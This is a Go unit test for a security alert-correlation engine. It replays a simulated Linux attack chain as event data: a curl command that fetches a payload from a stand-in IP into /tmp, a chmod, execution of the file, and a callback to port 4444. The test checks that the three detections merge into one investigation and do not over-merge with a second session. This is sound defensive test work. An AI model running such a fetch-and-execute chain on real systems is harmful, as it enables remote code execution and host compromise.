package correlate

import (
	"testing"
	"time"
)

// Scenario: a Linux ingress-tool-transfer + exec-from-tmp chain (the Linux
// analog of the Windows encoded-PowerShell/LOLBin demo), replayed twice under a
// shared sshd. Two properties are asserted:
//
//  1. Under-merge is beaten: the three detections in one session collapse into a
//     single investigation (3 alerts -> 1), driven by the write-then-exec rare
//     edge and shared lineage.
//  2. Over-merge is beaten: a second, independent session under the SAME sshd
//     (a hub) and reusing the SAME /usr/bin/curl binary (a common node) does NOT
//     merge with the first — sshd is a hub boundary and the curl binary is a
//     common-edge boundary.
func TestCorrelation_ThreeToOne_AndOverMergeGuard(t *testing.T) {
	const host = "web-01"
	base := time.Date(2026, 7, 8, 12, 0, 0, 0, time.UTC)
	at := func(s int) time.Time { return base.Add(time.Duration(s) * time.Second) }

	b := NewBaseline()
	// Preseed: executing /usr/bin/curl is extremely common across the fleet, so
	// the curl binary node becomes a common-edge boundary and cannot bridge two
	// investigations. Everything else is unseen (rare).
	for i := 0; i < 300; i++ {
		b.Observe(edgeKey("/usr/bin/curl", RelExecuted, KindFile))
	}

	// HubDegree=5 so bash (4 out-edges) is NOT a hub but sshd (6 children) IS.
	g := NewGraph(host, b, 5)

	events := []Event{
		// --- attack session 1 (bash1) ---
		{ID: "E1", HostID: host, TS: at(0), Type: ProcessStart, ProcGUID: "bash1", ParentGUID: "sshd", ProcImage: "/bin/bash"},
		{ID: "E2", HostID: host, TS: at(1), Type: ProcessStart, ProcGUID: "curl1", ParentGUID: "bash1", ProcImage: "/usr/bin/curl", Cmdline: "curl http://203.0.113.5/x -o /tmp/payload"},
		{ID: "E3", HostID: host, TS: at(2), Type: NetConnect, ProcGUID: "curl1", ProcImage: "/usr/bin/curl", RemoteAddr: "203.0.113.5", RemotePort: 80},
		{ID: "E4", HostID: host, TS: at(3), Type: FileWrite, ProcGUID: "curl1", ProcImage: "/usr/bin/curl", FilePath: "/tmp/payload"},
		{ID: "E5", HostID: host, TS: at(4), Type: ProcessStart, ProcGUID: "chmod1", ParentGUID: "bash1", ProcImage: "/usr/bin/chmod", Cmdline: "chmod +x /tmp/payload"},
		{ID: "E6", HostID: host, TS: at(5), Type: ProcessStart, ProcGUID: "pay1", ParentGUID: "bash1", ProcImage: "/tmp/payload"},
		{ID: "E7", HostID: host, TS: at(6), Type: NetConnect, ProcGUID: "pay1", ProcImage: "/tmp/payload", RemoteAddr: "203.0.113.5", RemotePort: 4444},

		// --- attack session 2 (bash2): independent, reuses curl + same sshd ---
		{ID: "E8", HostID: host, TS: at(0), Type: ProcessStart, ProcGUID: "bash2", ParentGUID: "sshd", ProcImage: "/bin/bash"},
		{ID: "E9", HostID: host, TS: at(1), Type: ProcessStart, ProcGUID: "curl2", ParentGUID: "bash2", ProcImage: "/usr/bin/curl"},
		{ID: "E10", HostID: host, TS: at(2), Type: NetConnect, ProcGUID: "curl2", ProcImage: "/usr/bin/curl", RemoteAddr: "198.51.100.9", RemotePort: 80},

		// --- noise sessions to push sshd over the hub threshold ---
		{ID: "E11", HostID: host, TS: at(0), Type: ProcessStart, ProcGUID: "bash3", ParentGUID: "sshd", ProcImage: "/bin/bash"},
		{ID: "E12", HostID: host, TS: at(0), Type: ProcessStart, ProcGUID: "bash4", ParentGUID: "sshd", ProcImage: "/bin/bash"},
		{ID: "E13", HostID: host, TS: at(0), Type: ProcessStart, ProcGUID: "bash5", ParentGUID: "sshd", ProcImage: "/bin/bash"},
		{ID: "E14", HostID: host, TS: at(0), Type: ProcessStart, ProcGUID: "bash6", ParentGUID: "sshd", ProcImage: "/bin/bash"},
	}
	for _, e := range events {
		g.AddEvent(e)
	}

	// hub / non-hub sanity
	if !g.Node("sshd").IsHub {
		t.Fatalf("sshd should be a hub (degreeOut=%d)", g.Node("sshd").DegreeOut)
	}
	if g.Node("bash1").IsHub {
		t.Fatalf("bash1 should NOT be a hub (degreeOut=%d)", g.Node("bash1").DegreeOut)
	}

	scorer := NewScorer()
	scorer.CtxMult["T1204.002"] = 1.15 // exec-from-tmp context bump
	c := NewCorrelator(g, DefaultParams(), scorer)

	// Three detections for session 1 (normally three separate alerts).
	d1 := Detection{ID: 1, RuleID: "lolbin_curl_download", HostID: host, ProcGUID: "curl1", EventIDs: []string{"E2", "E3", "E4"}, Technique: []string{"T1105"}, Severity: 65, TS: at(3)}
	d2 := Detection{ID: 2, RuleID: "exec_from_tmp", HostID: host, ProcGUID: "pay1", EventIDs: []string{"E6", "E7"}, Technique: []string{"T1204.002", "T1059.004"}, Severity: 70, TS: at(6)}
	d3 := Detection{ID: 3, RuleID: "chmod_then_exec", HostID: host, ProcGUID: "chmod1", EventIDs: []string{"E5"}, Technique: []string{"T1222.002"}, Severity: 55, TS: at(4)}

	a := c.Seed(d1)
	bb := c.Seed(d2)
	cc := c.Seed(d3)

	if a != bb || bb != cc {
		t.Fatalf("session-1 detections should share one investigation, got %d %d %d", a, bb, cc)
	}
	if got := len(c.Investigations()); got != 1 {
		t.Fatalf("want 1 investigation after session 1, got %d", got)
	}
	inv := c.Investigations()[a]
	if len(inv.Detections) != 3 {
		t.Fatalf("want 3 detections in investigation, got %d", len(inv.Detections))
	}
	// All 7 chain events (E1..E7) are pulled in via the subgraph's edges, not
	// just the 6 that tripped a rule.
	if len(inv.EventIDs) != 7 {
		t.Fatalf("want 7 events in investigation, got %d", len(inv.EventIDs))
	}
	wantTech := []string{"T1059.004", "T1105", "T1204.002", "T1222.002"}
	if !sameSet(inv.TechniqueSet, wantTech) {
		t.Fatalf("technique set = %v, want %v", inv.TechniqueSet, wantTech)
	}
	if inv.RiskScore <= 0 || inv.RiskScore > 100 {
		t.Fatalf("risk score out of range: %d", inv.RiskScore)
	}
	if len(inv.ScoreFactors) == 0 {
		t.Fatalf("expected auditable score factors, got none")
	}
	if inv.RootGUID != "bash1" {
		t.Fatalf("lineage root = %q, want bash1 (sshd is a hub boundary)", inv.RootGUID)
	}

	// Over-merge guard: session 2 must NOT join session 1.
	d4 := Detection{ID: 4, RuleID: "lolbin_curl_download", HostID: host, ProcGUID: "curl2", EventIDs: []string{"E9", "E10"}, Technique: []string{"T1105"}, Severity: 65, TS: at(2)}
	d := c.Seed(d4)
	if d == a {
		t.Fatalf("session 2 wrongly merged into session 1 (over-merge via sshd/curl)")
	}
	if got := len(c.Investigations()); got != 2 {
		t.Fatalf("want 2 investigations, got %d", got)
	}
	if _, ok := c.Investigations()[d].Nodes["curl1"]; ok {
		t.Fatalf("session-2 investigation must not contain session-1's curl1 node")
	}

	t.Logf("alert-reduction: session 1 = 3 detections -> 1 investigation (risk %d, root %s, techniques %v)",
		inv.RiskScore, inv.RootGUID, inv.TechniqueSet)
}

func sameSet(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	m := map[string]bool{}
	for _, s := range a {
		m[s] = true
	}
	for _, s := range b {
		if !m[s] {
			return false
		}
	}
	return true
}
